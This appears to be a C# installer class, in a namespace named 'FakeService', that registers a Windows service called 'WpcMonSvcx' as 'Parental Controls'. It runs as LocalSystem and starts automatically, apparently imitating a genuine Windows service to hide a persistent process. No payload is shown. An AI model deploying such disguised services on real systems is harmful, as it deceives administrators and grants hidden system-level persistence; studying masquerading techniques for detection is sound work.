using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration.Install;
using System.Linq;
using System.ServiceProcess;
using System.Threading.Tasks;

namespace FakeService
{
    [RunInstaller(true)]
    public partial class Installer1 : System.Configuration.Install.Installer
    {
        private readonly ServiceProcessInstaller processInstaller;
        private readonly ServiceInstaller serviceInstaller;
        public Installer1()
        {
            processInstaller = new ServiceProcessInstaller();
            serviceInstaller = new ServiceInstaller();

            processInstaller.Account = ServiceAccount.LocalSystem;

            serviceInstaller.ServiceName = "WpcMonSvcx";
            serviceInstaller.DisplayName = "Parental Controls";
            serviceInstaller.Description = "Enforces parental controls for child accounts in Windows. If this service is stopped or disabled, parental controls may not be enforced.";
            serviceInstaller.StartType = ServiceStartMode.Boot;

            Installers.Add(processInstaller);
            Installers.Add(serviceInstaller);

        }
    }
}
